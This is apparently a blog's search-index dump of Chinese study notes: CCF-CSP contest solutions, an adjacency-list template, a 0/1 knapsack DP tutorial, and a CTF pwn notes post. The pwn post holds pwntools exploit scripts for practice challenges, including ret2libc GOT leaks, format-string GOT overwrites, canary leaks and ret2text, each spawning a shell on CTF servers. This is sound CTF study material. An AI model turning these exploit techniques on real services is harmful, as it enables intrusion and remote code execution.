操作是对存储空间的优化，因为实际上在循环时间的时候我们需要用到的或者需要修改的数据是当前时间点和距离当前时间点延迟 d 后的时间，所以对于时间我们只需要维护一个长度为 d 的滚动数组即可。 第 125 行，关于二维数组 I，第一维度时间，d 的大小不超过 1000，但是因为为了使得地址连续（一个小优化）所以取为 1024，然后第二维度是神经元，因为只有神经元才需要记录，脉冲源不需要。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 2010; //1000个脉冲源+1000个神经元 const double INF = 1e8; int n, s, p, T; double dt; //时间间隔 int h[N], e[N], D[N], ne[N],idx; // 神经元邻接表 double W[N], v[N], u[N], a[N], b[N], c[N], d[N];//v, u, a, b, c, d是神经元相关量 int r[N], cnt[N]; //cnt存储神经元释放脉冲的次数 double I[1024][N / 2]; //表示神经网络状态，第一维度是时间，第二维度是脉冲源或神经元的标号，表示t时间下i个脉冲源（神经元）的状态 static unsigned long _next = 1; //注意这里为了防止next和头文件中的某个next冲突，前面加个下划线 /* RAND_MAX assumed to be 32767 */ int myrand(void) { _next = _next * 1103515245 + 12345; return((unsigned)(_next/65536) % 32768); } void add(int a, int b, double c, int d){ e[idx] = b; W[idx] = c, D[idx] = d, ne[idx] = h[a], h[a] = idx++; } int main(){ memset(h, -1, sizeof h); cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;s\u0026gt;\u0026gt;p\u0026gt;\u0026gt;T; cin\u0026gt;\u0026gt;dt; for(int i = 0; i \u0026lt; n;){ int rn; cin\u0026gt;\u0026gt;rn; double vv, uu, aa, bb, cc, dd; cin\u0026gt;\u0026gt;vv\u0026gt;\u0026gt;uu\u0026gt;\u0026gt;aa\u0026gt;\u0026gt;bb\u0026gt;\u0026gt;cc\u0026gt;\u0026gt;dd; for(int j = 0; j \u0026lt;rn; j++, i++){ v[i] = vv, u[i] = uu, a[i] = aa, b[i] = bb, c[i] = cc, d[i] = dd; } } for(int i = n; i \u0026lt; n + p; i ++) cin\u0026gt;\u0026gt;r[i]; int mod = 0; while(s -- ){ int a, b, d; double c; cin\u0026gt;\u0026gt;a\u0026gt;\u0026gt;b\u0026gt;\u0026gt;c\u0026gt;\u0026gt;d; add(a, b, c, d); //构建神经元图 mod = max(mod, d + 1);//此处是对空间的优化 } for(int i = 0; i \u0026lt; T; i ++){ int t = i % mod; for(int j = n; j \u0026lt; n + p; j ++){//遍历脉冲源 if(r[j] \u0026gt; myrand()){ for(int k = h[j]; ~k; k = ne[k]){ //释放脉冲 int x = e[k]; I[(t + D[k]) % mod][x] += W[k]; } } } for(int j = 0; j \u0026lt; n; j++){//遍历神经元 double vv = v[j], uu = u[j]; v[j] = vv + dt * (0.04 * vv * vv + 5 * vv + 140 - uu) + I[t][j]; u[j] = uu + dt * a[j] * (b[j] * vv - uu); if(v[j] \u0026gt;= 30){ for (int k = h[j]; ~k; k = ne[k]) //释放脉冲 { int x = e[k]; I[(t + D[k]) % mod][x] += W[k]; } cnt[j]++; v[j] = c[j], u[j] += d[j]; } } memset(I[t], 0, sizeof I[t]); } double minv = INF, maxv = -INF; int minc = INF, maxc = -INF; for (int i = 0; i \u0026lt; n; i ++ ) { minv = min(minv, v[i]); maxv = max(maxv, v[i]); minc = min(minc, cnt[i]); maxc = max(maxc, cnt[i]); } printf(\u0026#34;%.3lf %.3lf\\n\u0026#34;, minv, maxv); printf(\u0026#34;%d %d\\n\u0026#34;, minc, maxc); return 0; } 收集卡牌 这道题是求解期望，所以直接使用期望公式概率 x 状态的和即可，重点是如何求解状态。 因为不同的状态之间有依赖关系，形成的结构很像是树，所以用 DP 来做。 我们将状态表示为 f (i, j)，第一维度 i 表示选到了哪些牌（用位向量表示），第二个维度表示硬币数量，f (i, j) 就是在 i 的选牌，攒了 j 个硬币的情况下的期望。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 16, M = 1 \u0026lt;\u0026lt; N; int n, m; double p[N]; double f[M][N * 5 + 1]; //M表示取牌一共有2的16次方个情况，N * 5 + 1意思是N个牌，每个最多5个硬币，但是实际上攒够k硬币就会兑换牌，所以其实会有冗余。 double dp(int state, int coins, int r){ //抽到的牌，硬币数，没抽到的牌数量 auto\u0026amp; v = f[state][coins]; if(v \u0026gt;= 0) return v; if(coins \u0026gt;= r * m) return v = 0; v = 0; for(int i = 0; i \u0026lt; n; i++){ if(state \u0026gt;\u0026gt; i \u0026amp; 1){ v += p[i] * (dp(state, coins + 1, r) + 1); }else{ v += p[i] * ( dp((state | 1 \u0026lt;\u0026lt; i), coins, r - 1) + 1); } } return v; } int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;p[i]; } memset(f, -1, sizeof f); printf(\u0026#34;%0.10lf\\n\u0026#34;, dp(0, 0, n)); return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC23%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/","summary":"数组推导 当 b[i] == a[i]的情况下，数组 a 的和是最大的情况 当 b[i] == b[i-1]的时候，a[i] == 0 的情况下，数组 a 最小 1 2 3 4 5 6 7 8 9 10 11 12 13 14","title":"第23次CCF-CSP计算机软件能力认证题解"},{"content":"如此编码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i]; for(int i = 1; i \u0026lt;= n; i++){ b[i] = m % a[i]; m = m / a[i]; } for(int i = 1; i \u0026lt;= n; i++) cout\u0026lt;\u0026lt;b[i]\u0026lt;\u0026lt;\u0026#34; \u0026#34;; return 0; } 何以包邮 ？ 暴力循环的写法，可以过 70%的数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 33; int n, x; int w[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;x; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;w[i]; } int res = 1e8; for(int i = 0; i \u0026lt; 1\u0026lt;\u0026lt;n; i++){ int sum = 0; for(int j = 0; j \u0026lt; n; j++){ if(i \u0026gt;\u0026gt; j \u0026amp; 1){ sum += w[j]; } } if(sum \u0026gt;= x) res = min(sum, res); } cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl; return 0; } 用 dfs 暴搜的方法，同样过 70%的数据\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 33; int n, x; int w[N]; int res = 1e8; void dfs(int u, int sum){ if(u == n){ if(sum \u0026gt;= x) res = min(res, sum); }else{ dfs(u+1, sum); dfs(u+1, sum + w[u]); } } int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;x; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;w[i]; } dfs(0, 0); cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl; return 0; } 动态规划[[闫氏DP分析法]] 这个题我们可以转化为 01 背包问题。 01 背包问题是求解从 n 个物品中选择某几个物品使得在不超过背包容量 m 的情况下质量最大。 那么这个题，是希望选几本书在可以包邮（书本价格必须超过 x ）的前提下，尽可能的价格少。 那么转化一下，选几本书，在价值不超过 sum-x 的情况下，总价格尽可能的多。这样选出来的书本是要扔的，剩下的就是满足上述要求留下来的书。 那么背包容量就是 sum-x，物品质量和体积都是书本的价格，这样就可以直接套板子了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 33, M = 300010; int n, x; int w[N]; int f[M]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;x; int sum = 0; for(int i = 0; i \u0026lt; n; i++){ cin\u0026gt;\u0026gt;w[i]; sum += w[i]; } int m = sum - x; for(int i = 0; i \u0026lt; n; i++){ for(int j = m; j \u0026gt;= w[i]; j-- ){ f[j] = max(f[j], f[j-w[i]]+w[i]); } } cout\u0026lt;\u0026lt;sum - f[m]\u0026lt;\u0026lt;endl; return 0; } ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC27%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/","summary":"如此编码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m; for(int i = 1; i \u0026lt;= n; i++) cin\u0026gt;\u0026gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i \u0026lt;= n; i++) c[i] = c[i-1] * a[i];","title":"第27次CCF-CSP计算机软件能力认证题解"},{"content":"称检测点查询 直接排序选择前三就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; const int N = 210; int n, X, Y; struct Point { int x, y, d; int id; bool operator\u0026lt; (const Point\u0026amp; t) const { if (d != t.d) return d \u0026lt; t.d; return id \u0026lt; t.id; } }q[N]; int get_dist(int x1, int y1, int x2, int y2) { int dx = x1 - x2; int dy = y1 - y2; return dx * dx + dy * dy; } int main() { cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; X \u0026gt;\u0026gt; Y; for (int i = 0; i \u0026lt; n; i ++ ) { int x, y; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; q[i] = {x, y, get_dist(X, Y, x, y), i + 1}; } sort(q, q + n); for (int i = 0; i \u0026lt; 3; i ++ ) cout \u0026lt;\u0026lt; q[i].id \u0026lt;\u0026lt; endl; return 0; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import functools n, X, Y = map(int, input().split()) ans = [] for i in range(0, n): x, y = map(int, input().split()) dis = pow((x - X), 2) + pow((y - Y), 2) ans.append([i, dis, x, y]) ans.sort(key = lambda x : x[1]) for i in range(0, 3): print(ans[i][0] + 1) 风险人群筛查 注意题意，逗留包括经过。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #include\u0026lt;bits/stdc++.h\u0026gt; using namespace std; int main(){ int n, k, t, xl, yl, xr, yr; cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;k\u0026gt;\u0026gt;t\u0026gt;\u0026gt;xl\u0026gt;\u0026gt;yl\u0026gt;\u0026gt;xr\u0026gt;\u0026gt;yr; int ans_d = 0, ans_j = 0; while(n--){ int x, y; int cnt_k = 0, cnt = 0; for(int i = 0; i \u0026lt; t; i++){ cin\u0026gt;\u0026gt;x\u0026gt;\u0026gt;y; if(x \u0026gt;= xl \u0026amp;\u0026amp; x \u0026lt;= xr \u0026amp;\u0026amp; y \u0026gt;= yl \u0026amp;\u0026amp; y \u0026lt;= yr){ cnt++; }else{ cnt_k = max(cnt_k, cnt); cnt = 0; } cnt_k = max(cnt_k, cnt); } if(cnt_k \u0026gt; 0 ) ans_j++; if(cnt_k \u0026gt;= k) ans_d++; } cout \u0026lt;\u0026lt; ans_j \u0026lt;\u0026lt;endl \u0026lt;\u0026lt; ans_d \u0026lt;\u0026lt;endl; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 n, k, t, xl, yl, xr, yr = map(int, input().split()) ans_d = 0 ans_j = 0 for i in range(0, n): cnt_k = 0 cnt = 0 pos = list(map(int, input().split())) for j in range(0, t): x = pos[2 * j] y = pos[2 * j + 1] if x \u0026gt;= xl and x \u0026lt;= xr and y \u0026gt;= yl and y \u0026lt;= yr : cnt += 1 else: cnt_k = max(cnt_k, cnt) cnt = 0 cnt_k = max(cnt_k, cnt) if cnt_k \u0026gt; 0 : ans_j += 1 if cnt_k \u0026gt;= k : ans_d += 1 print(ans_j) print(ans_d) ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81%E9%A2%98%E8%A7%A3/","summary":"称检测点查询 直接排序选择前三就行 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; const int N = 210;","title":"第二十次CCF计算机软件能力认证题解"},{"content":"2022-8-28 get_started_3dsctf_2016 | LiuLian (liul14n.top)\n2022-8-27 [OGeek2019]babyrop1 有一些本地 libc 函数的用法，参考一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from pwn import * from LibcSearcher import * p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, 28820) elf=ELF(\u0026#39;./pwn1\u0026#39;) libc=ELF(\u0026#39;./libc-2.23.so\u0026#39;) system_libc=libc.symbols[\u0026#39;system\u0026#39;] binsh_libc=next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) write_plt=elf.plt[\u0026#39;write\u0026#39;] write_got=elf.got[\u0026#39;write\u0026#39;] write_libc=libc.symbols[\u0026#39;write\u0026#39;] read_got=elf.got[\u0026#39;read\u0026#39;] read_plt=elf.plt[\u0026#39;read\u0026#39;] main_addr=0x8048825 #payload1-截断strlen payload1=b\u0026#39;\\x00\u0026#39;+b\u0026#39;\\xff\u0026#39;*7 p.sendline(payload1) p.recvuntil(\u0026#34;Correct\\n\u0026#34;) #pay;pad2 - 泄露read的got地址 payload=b\u0026#39;a\u0026#39;*(0xe7+4)+p32(write_plt)+p32(main_addr) # ret1 ret2 payload+=p32(1)+p32(write_got)+p32(4) #write par1 par2 par3 #write_plt覆盖的是sub_80487D0函数的返回地址，而write函数是main函数的函数，所以后面需要有三个write的参数 p.sendline(payload) write_addr=u32(p.recv(4)) print(\u0026#39;[+]write_addr: \u0026#39;, hex(write_addr))#得到了write在内存中的位置 可以用题目提供的函数共享库算出system在内存中的位置 # libc=LibcSearcher(\u0026#39;read\u0026#39;, read_addr) # libc_base=read_addr-libc.dump(\u0026#39;read\u0026#39;) # system_addr=libc_base+libc.dump(\u0026#39;system\u0026#39;) # binsh_addr=libc_base+libc.dump(\u0026#39;str_bin_sh\u0026#39;) libc_base=write_addr-write_libc system_addr=system_libc+libc_base binsh_addr=binsh_libc+libc_base p.sendline(payload1) p.recvuntil(\u0026#34;Correct\\n\u0026#34;) payload=b\u0026#39;a\u0026#39;*(0xe7+4) payload+=p32(system_addr)+p32(main_addr)+p32(binsh_addr)#第二次直接把返回地址改为addr地址 p.sendline(payload) p.interactive() 2022-8-24 [第五空间 2019 决赛]PWN5 这个题是非常好的一个格式化字符串漏洞的题 可以有两个个思路\n利用格式化字符串漏洞覆盖指定内存地址 通过 IDA 可以发现语句 read (fd, \u0026amp;dword_84c044, 4u)，说明 dword_84c044 是个 4 个字节的变量，所以我们要的目标地址是覆盖以 0x0804c044 开头的 4 个字节的内存。 1 2 3 4 5 6 7 8 9 10 from pwn import * p=remote(\u0026#39;node4.buuoj.cn\u0026#39;,28876) addr=0x0804C044 payload=p32(addr)+p32(addr+1)+p32(addr+2)+p32(addr+3) #构造要覆盖的地址，4个字节，每个add+n指向1个字节 payload+=\u0026#39;%10$hhn%11$hhn%12$hhn%13$hhn\u0026#39; #利用%n$hhn对第n个参数指向的地址输入输入的字符数，大小为1个字节 # payload = fmtstr_payload(10,{addr:0x10101010}) p.sendline(payload) payload=str(0x10101010)#因为输入的字符树是16，所以每个字节是0x10 p.sendline(payload) p.interactive() 利用格式化字符串改写 atoi 的 got 地址，将其改为 system 的地址，配合之后的输入，得*到 shell。这种方法具有普遍性，也可以改写后面的函数的地址，拿到 shell。 1 2 3 4 5 6 7 8 9 from pwn import * p = process(\u0026#39;./pwn5\u0026#39;) elf = ELF(\u0026#39;./pwn5\u0026#39;) atoi_got = elf.got[\u0026#39;atoi\u0026#39;] system_plt = elf.plt[\u0026#39;system\u0026#39;] payload=fmtstr_payload(10,{atoi_got:system_plt}) p.sendline(payload) p.sendline(\u0026#39;/bin/sh\\x00\u0026#39;) p.interactive() 2022-4-26 [NISACTF 2022]ezstack\n这是个 32 位程序，不用找 pop rdi 给 system 传参 1 2 3 4 5 6 7 8 9 from pwn import * elf = ELF(\u0026#34;./pwn\u0026#34;) p = remote(\u0026#34;1.14.71.254\u0026#34;, 28783) system = elf.plt[\u0026#34;system\u0026#34;] binsh = 0x0804A024 payload = b\u0026#39;a\u0026#39; * 76 + p32(system) + p32(0xabcdabcd) + p32(binsh) p.sendlineafter(\u0026#34;Welcome to NISACTF\\n\u0026#34;, payload) p.interactive() [GFCTF 2021]where_is_shell\n因为一般在 linux 中’$0’被用于 bash 的环境变量，也就是说 system(\u0026quot;$0\u0026quot;) == system('bin/sh') tips 函数本身是没用的，但是 tips 函数的位置位于 0x400537 到 0x400547 之间，我们去看这部分的十六进制，发现了位于 0x400541 的 0x2430 也就是$0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pwn import * #p = process(\u0026#34;gfshell\u0026#34;) p = remote(\u0026#34;1.14.71.254\u0026#34;,28056) elf = ELF(\u0026#34;gfshell\u0026#34;) system = elf.plt[\u0026#39;system\u0026#39;] tips = 0x400541 ret = 0x400416 pop_rdi = 0x4005e3 payload = b\u0026#39;a\u0026#39;*0x10+p64(0)+p64(ret)+p64(pop_rdi)+p64(tips)+p64(system) p.recvuntil(\u0026#34;it?\u0026#34;) p.sendline(payload) p.interactive() 2022-4-25 [CISCN 2019 东北]PWN2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 1 from pwn import * 2 from LibcSearcher import * 3 4 5 p = remote(\u0026#34;1.14.71.254\u0026#34;, 28285) 6 elf = ELF(\u0026#34;./pwn\u0026#34;) 7 main = elf.sym[\u0026#34;main\u0026#34;] 8 puts_plt = elf.plt[\u0026#34;puts\u0026#34;] 9 puts_got = elf.got[\u0026#34;puts\u0026#34;] 10 pop_rdi = 0x400c83 11 ret = 0x4006b9 12 13 payload = b\u0026#34;a\u0026#34;*88 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) 14 p.sendlineafter(\u0026#34;Input your choice!\\n\u0026#34;, \u0026#34;1\u0026#34;) 15 p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) 16 p.sendline(payload) #不用理会加密，因为只会加密48个字节，不会对我们要用到的字段加密 17 puts_addr = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) 18 libc = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) 19 libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) 20 system = libc_base + libc.dump(\u0026#34;system\u0026#34;) 21 bin_sh = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) 22 payload = b\u0026#34;a\u0026#34;*88 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system) 23 p.recvuntil(\u0026#34;Input your choice!\\n\u0026#34;) 24 p.sendline(\u0026#34;1\u0026#34;) 25 p.recvuntil(\u0026#34;Input your Plaintext to be encrypted\\n\u0026#34;) 26 p.sendline(payload) 27 p.interactive() 2022-4-24 [NISACTF 2022]ReorPwn?\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 __int64 __fastcall fun(const char *a1) { __int64 result; // rax char v2; // [rsp+17h] [rbp-9h] int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+1Ch] [rbp-4h] v4 = strlen(a1); //输入字符串长度 for ( i = 0; ; ++i ) //交换前后两段字符 { result = (unsigned int)(v4 / 2); //中间那个数 if ( i \u0026gt;= (int)result ) break; v2 = a1[i]; //v2依次等于前半段字符 a1[i] = a1[v4 - i - 1]; a1[v4 - i - 1] = v2; } return result; } /bin/sh 7个字符 hs/nib/ from pwn import * p=remote(\u0026#39;1.14.71.254\u0026#39;,28321) payload = \u0026#34;hs/nib/\u0026#34; p.sendlineafter(\u0026#34;:\u0026#34;,payload) p.interactive() [BJDCTF 2020]babystack2.0\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * elf = ELF(\u0026#39;ret2text\u0026#39;) p=remote(\u0026#39;1.14.71.254\u0026#39;,28098) backdoor = elf.symbols[\u0026#39;backdoor\u0026#39;] p.sendlineafter(\u0026#34;name:\u0026#34;,\u0026#39;-1\u0026#39;) #-1躲过检查 payload = b\u0026#39;a\u0026#39; * 24 + p64(backdoor) p.sendlineafter(\u0026#34;name?\u0026#34;,payload) p.interactive() [BJDCTF 2020]babystack\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * elf = ELF(\u0026#39;ret2text\u0026#39;) p=remote(\u0026#39;1.14.71.254\u0026#39;,28098) backdoor = elf.symbols[\u0026#39;backdoor\u0026#39;] p.sendline(\u0026#39;100\u0026#39;) #这个100是因为源码按你输入的长度读取的，payload长24+，100长度足够 payload = b\u0026#39;a\u0026#39; * 24 + p64(backdoor) p.sendline(payload) p.interactive() littleof NSSCTF\nROPgadget --binary babyof --only \u0026quot;pop|ret”\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 from pwn import * from LibcSearcher import * #io = process(\u0026#39;./littleof\u0026#39;) io = remote(\u0026#39;1.14.71.254\u0026#39;, 28001) elf = ELF(\u0026#39;./littleof\u0026#39;) put_plt = elf.plt[\u0026#39;puts\u0026#39;] put_got = elf.got[\u0026#39;puts\u0026#39;] pop_rdi_ret = 0x0000000000400863 ret = 0x000000000040059e main = 0x0000000000400789 payload = b\u0026#39;a\u0026#39; * (0x50 - 0x8) io.recvuntil(\u0026#34;Do you know how to do buffer overflow?\u0026#34;) io.sendline(payload) io.recvuntil(\u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n\u0026#34;) canary = u64(io.recv(7).rjust(8, b\u0026#39;\\x00\u0026#39;)) print(\u0026#34;canary:\u0026#34;,hex(canary)) payload1 = b\u0026#39;a\u0026#39; * (0x50 - 0x8) + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(pop_rdi_ret) + p64(put_got) + p64(put_plt) + p64(main) io.sendlineafter(\u0026#34;Try harder!\u0026#34;, payload1) puts_addr = u64(io.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) libc = LibcSearcher(\u0026#39;puts\u0026#39;, puts_addr) libc_base = puts_addr - libc.dump(\u0026#39;puts\u0026#39;) system = libc_base + libc.dump(\u0026#39;system\u0026#39;) bin_sh = libc_base + libc.dump(\u0026#39;str_bin_sh\u0026#39;) payload = b\u0026#39;a\u0026#39; * (0x50 - 0x8) io.recvuntil(\u0026#34;Do you know how to do buffer overflow?\u0026#34;) io.sendline(payload) io.recvuntil(\u0026#34;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\n\u0026#34;) canary = u64(io.recv(7).rjust(8, b\u0026#39;\\x00\u0026#39;)) payload2 = b\u0026#39;a\u0026#39; * (0x50 - 0x8) + p64(canary) + b\u0026#39;a\u0026#39; * 0x8 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system) io.sendlineafter(\u0026#34;Try harder!\u0026#34;, payload2) io.interactive() [CISCN 2019 华北]PWN1 [NSSCTF - [CISCN 2019 华北]PWN1 (ctfer. vip)]( https://www.ctfer.vip/#/problem/100?back=%257B%2522contest%2522:%2522%2522 ,%2522year%25 22:0,%2522source%25 22:0,%2522name%2522:%2522%2522,%2522username%2522:%2522%2522,%2522type%25 22:2,%2522tag%2522:%255B%255D,%2522tagType%25 22:0,%2522date%2522:%2522%2522,%2522unsolved%2522: false,%2522page%25 22:1 %257D)\n在线进制转换-IEE754浮点数16进制转换 (lostphp.com)\n1 2 3 4 5 from pwn import * pro = remote(\u0026#39;1.14.71.254\u0026#39;,28091) payload = b\u0026#39;a\u0026#39;*44+p32(0x41348000) pro.sendlineafter(\u0026#39;number.\u0026#39;,payload) print(pro.recvall()) ","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/ctf/pwn/%E7%AE%80%E5%8D%95%E9%A2%98%E6%97%A7/","summary":"2022-8-28 get_started_3dsctf_2016 | LiuLian (liul14n.top) 2022-8-27 [OGeek2019]babyrop1 有一些本地 libc 函数的用法，参考一下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47","title":"简单题(旧)"},{"content":"模板代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int idx； int h[N], e[N], ne[N], w[N;] // 注意这里要初始化 head 为 -1 memset(h, 0xff, sizeof(h)); // 加入有向边 (x, y)，权值为 z void add(int x, int y, int z) { // 真实数据 e[idx] = y, w[idx] = z; // 在表头 x 处插入 ne[idx] = h[x], h[x] = idx++; } // 访问从 x 出发的所有边，注意这里终止条件的不同 for (int i = h[x]; ~i; i = ne[i]) {//~i表示i不等于-1 int y = e[i], z = w[i]; } 邻接表构成的数据结构图示 注意这里有个容易搞混的点，每条链表上挂的是从对应头结点的所有出边，而不是图中的一条路径。\n参考 邻接表代码 邻接表解释 y总数据结构笔记一\n","permalink":"https://juhuax.github.io/posts/study/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/%E9%82%BB%E6%8E%A5%E8%A1%A8/","summary":"模板代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int idx； int h[N], e[N], ne[N], w[N;] // 注意这里要初始化 head 为 -1 memset(h, 0xff, sizeof(h)); // 加入有向边 (x, y)，权值为 z void add(int x, int y, int z) { // 真实数","title":"邻接表"},{"content":"题干：N 个物品，每个物品有对应的价值和体积，背包容量为 V，如何选择物品使得在不超过背包容量的前提下，价值之和最大。 每个物品都可以选和不选，两种选择，那么一共有 $2^N$ 两种方案，所以题目是一个有限集合的最值问题，所以可以用 y 氏 DP 法来分析\n步骤一：状态表示 $f(i,j)$\n确定集合：（i 和 j 表示的意思）在只考虑前 i 个物品，并且物品总体积不超过 j 的选法的集合 属性：（$f(i,j)$ 的值代表的意思，和题意相关）当前集合中的最大价值 步骤二：状态计算 那么 $f(i,j)$ 如何计算呢，对于上述的集合，我们可以分为两个子集 一个子集是没有选择物品 i 的集合 如果不选择物品 i，那么我们只需要找到只考虑前 $i-1$ 个物品，并且物品总体积不超过 j 的选法集合中的最大价值，也就是 $f(i-1,j)$ 一个子集是选择了物品 i 的集合 如果选择了物品 i，那么我们只需要找到只考虑前 $i-1$ 个物品，并且物品总体积不超过 $j-v[i]$ 的选法集合中的最大价值，也就是 $f(i-1,j-v[i])$ 然后加上物品 i 的价值 $w [i]$ $f(i-1,j-v[i])+w[i]$ 注意 j 和 v[i]的大小 板子 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include\u0026lt;iostream\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; const int N=1005; int n,v; int V[N],W[N]; int dp[N][N]; int main(){ cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;v; for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;V[i]\u0026gt;\u0026gt;W[i]; for(int i=1;i\u0026lt;=n;i++){ for(int j=0;j\u0026lt;=v;j++){ dp[i][j]=dp[i-1][j]; if(j\u0026gt;=V[i]) dp[i][j]=max(dp[i][j],dp[i-1][j-V[i]]+W[i]); } } 